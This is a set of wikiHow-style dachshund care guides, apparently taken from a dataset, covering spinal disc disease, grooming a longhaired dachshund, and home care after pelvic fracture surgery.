You can also add them to the front of your couch or any other piece of furniture that you want to give your dog access to.

, If your dachshund is showing signs of back pain, be sure to confine them to a puppy crate for strict rest. In cases of minor injury, this will give the inflammation in the back a chance to subside.

, Dachshunds are prone to inter-vertebral disc disease or more simply ""slipped discs."" To understand why disc disease can be so painful, it helps to understand the anatomy of the back. The spine is not a rigid rod, but has some flexibility because it is made up of smaller individual bones called vertebrae. There is a hollow 'arch' to each vertebra through which the spinal cord passes. Each vertebra is cushioned from its immediate neighbor by a disc, which is like a spongy doughnut. The discs articulate with the solid body of the vertebra, but should not intrude on the spinal cord at all.Each disc has a spongy center (nucleus pulposus) surrounded by a more fibrous body (annulus fibrosus). Damage to the disc can happen when the liquid core becomes solid and its cushioning effect is lost, or if the fibrous body ages and becomes brittle and prone to cracking or rupture.
When force is applied (such as when the dachshund jumps off a chair or twists awkwardly) the disc is prone to shear and tear. If the now-stiff nucleus pulposus presses upwards it puts pressure on the spinal cord, which results in pain. If the disc fails catastrophically the contents of the nucleus pulposus can be forced explosively into the spinal cord and cause nerve damage.Dachshunds, along with breeds such as the Pekinese and Shih Tzu, are genetically predisposed to premature ageing of the cartilage part of the disc. This, along with the structure forces at work on the spine, mean they are prone to back pain, from ages as young as 2 - 4 years."

Trim inner ear hair.,
Trim the hair on their stomachs.,
Wipe each inner ear.,
Examine their teeth and gums.,
Brush their teeth.,
Gently wipe their eyes.,
Trim their nails.",How to Groom a Longhair Dachshund2," Longhaired dachshunds are prone to ear problems since their coat and floppy ears can trap bacteria that cause infections. If needed, use pet scissors to trim their hair on the inner flap of your dog’s ear. This helps to prevent tangles, and allows for good circulation so moisture and dirt don’t build up.You'll need to trim their ear hair whenever the hair becomes fluffy or bushy, or when it is long enough to reach into their ear canal.

, In show terms, this is called the “flag.” Longhaired dachshunds tend to accumulate debris and tangles in this area of their coat. It’s a good idea to keep this hair trimmed. Not only will it be easier to brush and keep clean, it will help your dog to get around more easily.Using grooming scissors, trim the hair so it does not reach the ground.


It is a good idea to keep this area trimmed. Owners may even want to keep the hair fairly short in this area, especially if they are not using the dog for shows.

, Using a cotton ball and a dog ear cleaner solution, which you can find at pet stores and large retailers, gently wipe the inside of your dog’s ears. According to the solution’s directions, place the correct amount into the ear and let it soak into the canal.Wait for about 10 to 15 minutes and begin wiping upwards to dislodge any wax. Check for any discharge from the ear canal.


It’s a good idea to check your dog’s ears each time you groom them. Since dachshunds are prone to ear problems, this helps you catch conditions early on., Dental health is very important in dachshunds. Regularly examine your dog’s mouth to look for any broken teeth, red or irritated gums, and brownish teeth. Dogs that are hesitant to play with chew toys, eat, or drink cold water may have a periodontal disease. Consult your veterinarian if you notice any of these problems., Using toothpaste specially designed for dogs and a soft toothbrush, brush your dog’s teeth. Gently hold back their lips so the teeth are exposed and gently brush each tooth. Ideally, you should brush their teeth each day.


Many dogs are uncomfortable with having their teeth brushed. You can get your dog used to having their teeth brushed by putting a small amount of dog toothpaste on your finger and spreading it across their teeth for a few seconds. Gradually work up to using a toothbrush when your dog becomes used to having you manipulate their mouth., Using a piece of soft cotton fabric or a cotton ball that has been dampened with warm water, wipe around the rim of their eyes. You can also use dog eye wipes, which can be found at pet stores and large retailers. You’ll need to hold the dog’s muzzle while you’re wiping to avoid accidentally poking their eye., If you exercise your dachshund on concrete or pavement, their nails will not need to be trimmed as frequently since they will naturally become worn down.Your dachshund’s nails are very small so use a small dog nail clipper, not a regular nail clipper. Clip only the very tip of the nail, avoiding the quick. The quick is a vein that runs through the nail, and will bleed if nicked.It can be difficult to see the quick, especially with black nails. If you do happen to cut the quick, have a styptic powder and some gauze or cotton balls handy. This will help the blood clot and will stop the bleeding.

A non-slip bath mat will help keep your dachshund from slipping in the water. If you don’t have a mat, you can place a small towel on the bottom of the tub or sink.

, The products you use to bathe your longhaired dachshund should be specifically formulated for dogs. Use a high-quality non-detergent shampoo. Ideally, use a shampoo and conditioner that are fragrance free since these added chemicals can irritate your dog’s skin.Hypoallergenic shampoos and conditioners are good as well. Some shampoos are marketed as tearless, but you should always avoid getting shampoo directly into your dog’s eyes.
You can find quality pet shampoos online, at a pet store, or at a grooming salon.

, Using a cup filled with water, a spray nozzle, or your hands, wet your dog’s body. Pour a small amount of shampoo into your hand and rub your hands together. Then, begin to massage the shampoo into your dog’s coat. You should cover their entire body but avoid their face and ears.


Massage the shampoo into a lather in their coat. Make sure that you pay special attention to their tails and their stomachs, since these areas tend to get dirtier.

, Use warm water to rinse the shampoo out of their coats. Make sure that you get all of the shampoo out of their fur, or your dog may experience some skin irritation later on.

, Using a soft washcloth, now is the time to wash their face and ears. Wet the washcloth with warm water and work in a small amount of shampoo. Cover your dog’s eyes with one hand while you gently wipe their face and ears.You’ll need to rinse off this shampoo as well, but be very careful with getting water around their ears. Water can get trapped inside your dog’s ear canal and cause an infection.

, Using a blow dryer on the lowest setting, begin to dry the dog’s coat. Make sure the air is not too hot so you don’t burn or irritate their skin. You can gently comb while you dry.


Use a dry piece of cloth to wipe their inner ears. You want this area to be very dry after their bath to help prevent any infections.You can use a towel to dry your dachshund, but this will cause the hair to poof out and won’t be as aesthetically pleasing. If you do use a towel, pat the hair instead of rubbing it to prevent tangles.

Plan for full-time care.,
Get a crate, preferably one with rollers on the bottom.,
Purchase a liner for the bottom of the crate for the times that your dog has an accident.,
Buy or rig a comfortable bed to put in the crate for your dog, keeping in mind that your dog will be spending a lot of time in there for the next several weeks.,
Keep water and food inside of the crate.,
Place the crate in an area where your dog can see you.,
Give pain medication.,
Carefully follow your veterinarian's orders on when your dog can walk and exercise.,
Diligently monitor the surgery site.,
Your vet may have given you some antibiotic medication to give your Dachshund.,
Make sure your dog wears his cone collar.,
Use a belly swing.",How to Care for a Dachshund With a Broken or Fractured Pelvis," Dachshunds will return the love you give them twice over, and in some cases four times. You have a job ahead of you that at times will be hard but most of the time will go better than you expect. If you are a single person who has a full-time job, you should consider finding a dog boarding facility that can take care of a dog with medical problems.


Keep in mind though that very few people can take as good of care of your dog as you personally will. If you are single, and can take care of your dog during his entire recovery, you have something that you can be proud of. If you are married, and have kids that are good with animals, you have a situation that the entire family can be proud of.
You may think that you know your Dachshund very well, but once the recovery is over, you will find that you have come to know your dog even better and, if you have a smart dog, he will come to know you better. Never underestimate the intelligence of a Dachshund. At the end of this situation, you and your dog will become more bonded, even if you thought it was not possible to love your dog more than you already did.;
, Don't get one that the dog will barely fit in because right after surgery there will be times that you will need to physically lift him out of the crate. This is hard to do in a small crate. Later, when your dog is able to move, he will appreciate the extra space.


The crate in the right hand picture is a bit too large, but this type can come with rollers. The all-wire types usually do not. (And yes, the dog in the picture looks like a lab ––the image is for the benefit of the crate). Note of caution: It's not a good idea to let a cat stay on a Dachshund's crate after surgery, even if they got along very well before. The dog may see the crate as ""his"" and only want humans around it.

, Even if your dog is house trained, it's very likely that right after surgery, he will have an accident in the crate. After a bit of time has passed, your dog will let you know when it's time to go out and potty. The blue liner in the right hand picture is a good choice.

, The bed on the right is a good choice because it is square and thick. You can also use the blankets you already have on hand to make your own bed crate to your satisfaction. Your goal is to ease your dog's pain and keep him warm too. Making your dog comfortable will speed up his recovery and reduce your workload.

, If your dog has a weight problem, it might be advisable to keep the food outside of the crate unless your veterinarian recommends otherwise. An overweight dog may not heal as quickly and will be more prone to re-injuring the hip. If you have to cut back on food, it would be a good idea to give your dog vitamins, but you'll need to clear this with your vet just to make sure that it does not interfere with whatever medications your dog is taking. There really are a surprising number of things that may interfere with medications. The food and water bowls on the right are a bit too big for a crate. The combined food and water bowls need frequent cleaning due to the fact that some pets scatter their food into the water.

, This is where the rollers come in handy. A Dachshund will recover faster if he can see you a majority of the time. This is also especially helpful right after surgery, as you will need to be able to monitor your pet for any changes.

, Your vet should have given you some pain medication for your dog. They may tell you to give the meds when you think your dog is in pain. The problem with this is that dogs will sometimes hide their pain from their owners - especially a Dachshund. Right after surgery you should give your dog the pain meds regardless of whether they look like they are in pain or not. After a few days you should be able to cut back gradually on the number of times per day you give the pain meds. If the surgery went well and you have taken good care of them, the need for pain meds will decrease. If your dog still appears to be hurting, you need to call your vet.

, This all depends on how severe the injury was and how extensive your Dachshund's surgery was. There is no one set of rules that applies to all situations. Some dogs with successful surgery may be able to walk short distances within a day or so after the procedure.

, Check for drainage, swelling, redness, or anything that looks unusual. If the drainage is clear in color there is little need for concern, but if it does not stop after a few days you need to call your vet.


Any drainage that is not clear needs to be reported.
Swelling can be caused by the surgery itself, but if it does not appear to be going away, or if it increases, you need to call your vet.
Redness can be caused by the surgery also, but if it does not go away, increases, or if you observe a new area, you need to call your vet. Keep the area as clean and dry as possible. A new infection will seriously hamper your dog's recovery time and increase your workload.

, Be sure to follow the instructions on the bottle. Keep notes on the times you gave your dog any medication. It's easy even for an experienced person to forget when they gave their dog his last dose of meds and how many times that day they gave them. Develop a new habit of writing the times down. It will come in handy.

, When your dog comes home it should be wearing a cone collar provided by your vet. Your dog will need to wear this at all times until the stitches are removed. This is to prevent him from biting at or licking his stitches. Your dog will hate it but it is a necessary evil. It can be removed sometime after the stitches are removed. If your dog starts licking the surgery site again, the collar will need to be put back on. A little bit of licking is okay––a lot of licking is not.


Don't throw the collar away. It's possible it can be used as a training tool once your dog has recovered. If, and only if, you catch your dog in the act of doing something that will cause him great harm, tell him ""No"" and put the collar back on again for a short period of time. If you have a smart dog, he will get the message that what he just did can be very harmful. Don't use the collar for minor everyday transgressions, and never use it unless you have caught the dog doing something right at that very time. Putting it on later or allowing the kids to put it on for fun sends a confusing message to the dog.

, When taking your Dachshund out of the crate to potty, you will need a belly sling to support his stomach. This takes weight off of the dog's hips. Finding one online or in a pet store is next to impossible. The sling in the picture was probably provided by a vet. Be sure to ask if they have one to spare.


You can rig one up yourself fairly easily and custom fit it to you and your Dachshund's liking. You can take a long towel, run it underneath your dog's belly, and tie it in a knot where you hold it.
The idea is to be able to walk comfortably and support your dog's weight. This is not a perfect system, but it does work. You may, using your own imagination, come up with something better. This system was used by an elderly man who walked with a cane and had his Dachshund on a leash at the same time. A younger, more able person should be able to use this until they come up with something better.
